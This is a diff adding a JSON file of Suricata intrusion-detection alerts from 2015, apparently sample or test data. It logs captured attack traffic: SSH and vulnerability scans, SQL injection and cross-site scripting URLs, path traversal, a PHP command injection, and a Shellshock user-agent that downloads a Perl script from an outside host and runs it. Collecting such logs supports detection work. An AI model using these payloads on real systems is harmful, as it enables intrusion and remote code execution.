@@ -1,0 +1,5136 @@
+[
+  {
+    "timestamp": "2015-03-29T11:01:38.221126-0600",
+    "flow_id": 1959620435402694,
+    "pcap_cnt": 98966,
+    "event_type": "alert",
+    "src_ip": "222.186.56.46",
+    "src_port": 4904,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 22,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2001219,
+      "rev": 20,
+      "signature": "ET SCAN Potential SSH Scan",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 66,
+      "bytes_toclient": 0,
+      "start": "2015-03-29T11:01:38.221126-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-26T18:49:46.900254-0600",
+    "flow_id": 1335265220756620,
+    "pcap_cnt": 4780,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 63259,
+    "dest_ip": "157.56.114.104",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2001595,
+      "rev": 10,
+      "signature": "ET CHAT Skype VOIP Checking Version (Startup)",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "ui.skype.com",
+      "url": "/ui/0/7.2.0.103./en/getlatestversion?ver=7.2.0.103&uhash=1fdc256726fe284b6b490bfa128de6f14",
+      "http_content_type": "text/plain",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 9
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 416,
+      "bytes_toclient": 524,
+      "start": "2015-03-26T18:49:46.787596-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:18:37.430733-0600",
+    "flow_id": 904218983420442,
+    "pcap_cnt": 150002,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 38608,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2001743,
+      "rev": 8,
+      "signature": "ET TROJAN HackerDefender Root Kit Remote Connection Attempt Detected",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "flow": {
+      "pkts_toserver": 6,
+      "pkts_toclient": 4,
+      "bytes_toserver": 500,
+      "bytes_toclient": 272,
+      "start": "2015-03-17T02:18:22.283162-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-26T18:49:46.900254-0600",
+    "flow_id": 1335265220756620,
+    "pcap_cnt": 4780,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 63259,
+    "dest_ip": "157.56.114.104",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "ui.skype.com",
+      "url": "/ui/0/7.2.0.103./en/getlatestversion?ver=7.2.0.103&uhash=1fdc256726fe284b6b490bfa128de6f14",
+      "http_content_type": "text/plain",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 9
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 416,
+      "bytes_toclient": 524,
+      "start": "2015-03-26T18:49:46.787596-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2002157,
+      "rev": 11,
+      "signature": "ET CHAT Skype User-Agent detected",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:14:59.130726-0600",
+    "flow_id": 1829127292340180,
+    "pcap_cnt": 140108,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 55199,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2002664,
+      "rev": 10,
+      "signature": "ET SCAN Nessus User Agent",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/status.php3",
+      "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 567,
+      "bytes_toclient": 671,
+      "start": "2015-03-17T02:14:58.870356-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-08T20:17:04.944268-0600",
+    "flow_id": 108172528293454,
+    "pcap_cnt": 34019,
+    "event_type": "alert",
+    "src_ip": "66.135.38.206",
+    "src_port": 50497,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "95.192.215.175",
+      "url": "/cgi-bin/fire.cgi",
+      "http_user_agent": "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 214
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 641,
+      "bytes_toclient": 676,
+      "start": "2015-04-08T20:17:03.038478-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2002823,
+      "rev": 11,
+      "signature": "ET POLICY POSSIBLE Web Crawl using Wget",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    }
+  },
+  {
+    "timestamp": "2015-03-25T04:07:53.803407-0600",
+    "flow_id": 330147843837326,
+    "pcap_cnt": 75538,
+    "event_type": "alert",
+    "src_ip": "104.246.96.148",
+    "src_port": 22054,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 55269,
+    "proto": "UDP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2003311,
+      "rev": 3,
+      "signature": "ET P2P Edonkey Publicize File ACK",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "app_proto": "failed",
+    "flow": {
+      "pkts_toserver": 2,
+      "pkts_toclient": 1,
+      "bytes_toserver": 128,
+      "bytes_toclient": 68,
+      "start": "2015-03-25T04:07:48.363918-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-29T15:48:42.619797-0600",
+    "flow_id": 713346608857128,
+    "pcap_cnt": 127388,
+    "event_type": "alert",
+    "src_ip": "118.98.104.21",
+    "src_port": 56860,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2003466,
+      "rev": 15,
+      "signature": "ET SCAN PHP Attack Tool Morfeus F Scanner",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "95.192.4.248",
+      "url": "/user/soapCaller.bs",
+      "http_user_agent": "Morfeus Fucking Scanner",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 216
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 453,
+      "bytes_toclient": 678,
+      "start": "2015-03-29T15:48:41.983080-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-27T08:39:59.187544-0600",
+    "flow_id": 359703170981064,
+    "pcap_cnt": 85426,
+    "event_type": "alert",
+    "src_ip": "222.66.95.253",
+    "src_port": 1359,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2006402,
+      "rev": 11,
+      "signature": "ET POLICY Incoming Basic Auth Base64 HTTP Password detected unencrypted",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "95.192.4.248",
+      "url": "/manager/html",
+      "http_user_agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 6,
+      "bytes_toserver": 522,
+      "bytes_toclient": 743,
+      "start": "2015-03-27T08:39:55.662728-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:20:50.387912-0600",
+    "flow_id": 236171189946058,
+    "pcap_cnt": 155271,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 42257,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2006445,
+      "rev": 13,
+      "signature": "ET WEB_SERVER Possible SQL Injection Attempt SELECT FROM",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 219
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 750,
+      "bytes_toclient": 652,
+      "start": "2015-03-17T02:20:50.067274-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:20:50.387912-0600",
+    "flow_id": 236171189946058,
+    "pcap_cnt": 155271,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 42257,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 219
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 750,
+      "bytes_toclient": 652,
+      "start": "2015-03-17T02:20:50.067274-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2006446,
+      "rev": 12,
+      "signature": "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT",
+      "category": "Web Application Attack",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:19:32.181409-0600",
+    "flow_id": 622464838401091,
+    "pcap_cnt": 152446,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 40881,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2008570,
+      "rev": 4,
+      "signature": "ET POLICY External Unencrypted Connection to BASE Console",
+      "category": "Misc activity",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/base_main.php",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 211
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 627,
+      "bytes_toclient": 644,
+      "start": "2015-03-17T02:19:31.916547-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:14:52.077598-0600",
+    "flow_id": 397567447473926,
+    "pcap_cnt": 139308,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 54868,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 1,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2009361,
+      "rev": 5,
+      "signature": "ET WEB_SERVER cmd.exe In URI - Possible Command Execution Attempt",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/cmd.exe",
+      "http_user_agent": "Mozilla/5.0 Gecko/20081007 Firefox/3.0",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 205
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 6,
+      "pkts_toclient": 4,
+      "bytes_toserver": 1058,
+      "bytes_toclient": 1944,
+      "start": "2015-03-17T02:14:51.663302-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:11:37.268765-0600",
+    "flow_id": 1965574095148764,
+    "pcap_cnt": 136845,
+    "event_type": "alert",
+    "src_ip": "67.207.202.9",
+    "src_port": 44381,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2009362,
+      "rev": 6,
+      "signature": "ET WEB_SERVER /system32/ in Uri - Possible Protected Directory Access Attempt",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "90.236.3.35",
+      "url": "/...%5C.%5C...%5C.%5C...%5C.%5C...%5C.%5C...%5C.%5C...%5C.%5Cwinnt%5Csystem32%5Cipconfig.exe/phpinfo/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "http_user_agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 279
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 623,
+      "bytes_toclient": 741,
+      "start": "2015-03-17T02:11:36.628444-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:08:47.669112-0600",
+    "flow_id": 1817874453723499,
+    "pcap_cnt": 132587,
+    "event_type": "alert",
+    "src_ip": "67.207.202.9",
+    "src_port": 32776,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2009714,
+      "rev": 7,
+      "signature": "ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "90.236.3.35",
+      "url": "/phpinfo/phpinfo/index.php?='%3E%3Cscript%3Ealert(%22foo%22);%3C/script%3E'",
+      "http_user_agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 223
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 547,
+      "bytes_toclient": 685,
+      "start": "2015-03-17T02:08:47.227691-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:08:48.199768-0600",
+    "flow_id": 1919643703785275,
+    "pcap_cnt": 132600,
+    "event_type": "alert",
+    "src_ip": "67.207.202.9",
+    "src_port": 32863,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2009715,
+      "rev": 5,
+      "signature": "ET WEB_SERVER Onmouseover= in URI - Likely Cross Site Scripting Attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "90.236.3.35",
+      "url": "/phpinfo/phpinfo/index.php?=%22+onmouseover%3D%22javascript:alert%28%27foo%27%29%22+%22",
+      "http_user_agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 223
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 559,
+      "bytes_toclient": 685,
+      "start": "2015-03-17T02:08:47.669499-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T21:27:02.538121-0600",
+    "flow_id": 558077850301842,
+    "pcap_cnt": 40910,
+    "event_type": "alert",
+    "src_ip": "217.172.189.243",
+    "src_port": 80,
+    "dest_ip": "192.168.0.53",
+    "dest_port": 2042,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2009897,
+      "rev": 14,
+      "signature": "ET TROJAN Possible Windows executable sent when remote host claims to send html content",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "217.172.189.243",
+      "url": "/?7d0eabf9d51e708d121fa10a4c07673c",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2595
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 5,
+      "bytes_toserver": 456,
+      "bytes_toclient": 4490,
+      "start": "2015-04-07T21:27:02.275858-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:16:47.658262-0600",
+    "flow_id": 1470854012583044,
+    "pcap_cnt": 145603,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 59949,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2010766,
+      "rev": 11,
+      "signature": "ET POLICY Proxy TRACE Request - inbound",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/AVDS1617837600.html",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "message/http",
+      "http_method": "TRACE",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 335
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 597,
+      "bytes_toclient": 753,
+      "start": "2015-03-17T02:16:47.375940-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-29T04:41:19.304641-0600",
+    "flow_id": 1137560052021144,
+    "pcap_cnt": 61347,
+    "event_type": "alert",
+    "src_ip": "188.165.22.205",
+    "src_port": 50031,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "url": "/w00tw00t.at.ISC.SANS.DFind:)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 294,
+      "bytes_toclient": 658,
+      "start": "2015-03-29T04:41:19.178072-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2010794,
+      "rev": 8,
+      "signature": "ET WEB_SERVER DFind w00tw00t GET-Requests",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    }
+  },
+  {
+    "timestamp": "2015-03-18T03:57:23.552511-0600",
+    "flow_id": 1119289078165627,
+    "pcap_cnt": 27158,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 49899,
+    "dest_ip": "173.252.107.17",
+    "dest_port": 5222,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2010819,
+      "rev": 4,
+      "signature": "ET CHAT Facebook Chat using XMPP",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "app_proto": "failed",
+    "flow": {
+      "pkts_toserver": 19,
+      "pkts_toclient": 24,
+      "bytes_toserver": 4056,
+      "bytes_toclient": 7457,
+      "start": "2015-03-18T03:56:55.897147-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-16T04:36:19.575414-0600",
+    "flow_id": 1869623727401330,
+    "pcap_cnt": 111085,
+    "event_type": "alert",
+    "src_ip": "217.195.49.103",
+    "src_port": 53408,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2010920,
+      "rev": 8,
+      "signature": "ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=)",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "www.pwned.se",
+      "url": "/skyblue/cm0.php?cmd=cat%20xx",
+      "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 1018,
+      "bytes_toclient": 930,
+      "start": "2015-03-16T04:36:18.174450-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:20:50.387912-0600",
+    "flow_id": 236171189946058,
+    "pcap_cnt": 155271,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 42257,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 219
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 750,
+      "bytes_toclient": 652,
+      "start": "2015-03-17T02:20:50.067274-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2010963,
+      "rev": 6,
+      "signature": "ET WEB_SERVER SELECT USER SQL Injection Attempt in URI",
+      "category": "Web Application Attack",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.747931-0600",
+    "flow_id": 308064659194010,
+    "pcap_cnt": 166048,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47676,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011037,
+      "rev": 5,
+      "signature": "ET WEB_SERVER Possible Attempt to Get SQL Server Version in URI using SELECT VERSION",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/top/topusers.php?offset=0;select+1,version()+as+user_name,3,4,5;",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 222
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 648,
+      "bytes_toclient": 655,
+      "start": "2015-03-17T02:23:48.475290-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:24:13.735876-0600",
+    "flow_id": 1944193797357734,
+    "pcap_cnt": 168343,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 48208,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/photo.php?albumid=-493'%20UNION%20SELECT%201,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8%20--%20'",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 215
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 5,
+      "bytes_toserver": 829,
+      "bytes_toclient": 796,
+      "start": "2015-03-17T02:24:10.950438-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011042,
+      "rev": 3,
+      "signature": "ET WEB_SERVER MYSQL SELECT CONCAT SQL Injection Attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:07:42.709433-0600",
+    "flow_id": 1826520217786456,
+    "pcap_cnt": 129150,
+    "event_type": "alert",
+    "src_ip": "67.207.202.9",
+    "src_port": 55836,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 5,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011141,
+      "rev": 4,
+      "signature": "ET WEB_SERVER PHP Easteregg Information-Disclosure (phpinfo)",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "90.236.3.35",
+      "url": "/phpinfo/index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000",
+      "http_user_agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 1196
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 46,
+      "pkts_toclient": 57,
+      "bytes_toserver": 4328,
+      "bytes_toclient": 76812,
+      "start": "2015-03-17T02:07:29.956504-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-18T03:04:09.840955-0600",
+    "flow_id": 882610402882413,
+    "pcap_cnt": 19213,
+    "event_type": "alert",
+    "src_ip": "95.199.31.163",
+    "src_port": 51537,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011142,
+      "rev": 3,
+      "signature": "ET WEB_SERVER PHP Easteregg Information-Disclosure (php-logo)",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "www.pwned.se",
+      "url": "/phpinfo/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "http_user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+      "http_content_type": "image/gif",
+      "http_refer": "http://www.pwned.se/phpinfo/",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2524
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 649,
+      "bytes_toclient": 2981,
+      "start": "2015-03-18T03:04:09.783213-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-18T03:04:09.876117-0600",
+    "flow_id": 1048610888839667,
+    "pcap_cnt": 19224,
+    "event_type": "alert",
+    "src_ip": "95.199.31.163",
+    "src_port": 51538,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011143,
+      "rev": 3,
+      "signature": "ET WEB_SERVER PHP Easteregg Information-Disclosure (zend-logo)",
